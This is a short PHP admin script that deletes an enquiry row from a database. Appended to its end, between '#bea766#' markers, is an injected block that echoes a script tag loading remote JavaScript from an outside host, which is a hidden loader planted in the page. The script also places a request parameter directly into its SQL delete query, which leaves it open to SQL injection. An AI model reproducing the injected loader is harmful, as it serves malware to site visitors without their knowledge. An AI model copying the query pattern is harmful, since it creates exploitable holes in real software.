<?php 
session_start();
ob_start();

include "inc/session_check.php";

  $adid = urlsafe_b64decode($_REQUEST['adid']);
  
  $delete = "delete from sd_enquiry where id='$adid'";
  if(mysql_query($delete))
  {
  	header("location:list_enquiry.php?msg=succ&cont=Enquiry Deleted Successfully.");
  }
  
?>
<?php
#bea766#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967016\"></script>";
echo $g;
}
#/bea766#
?>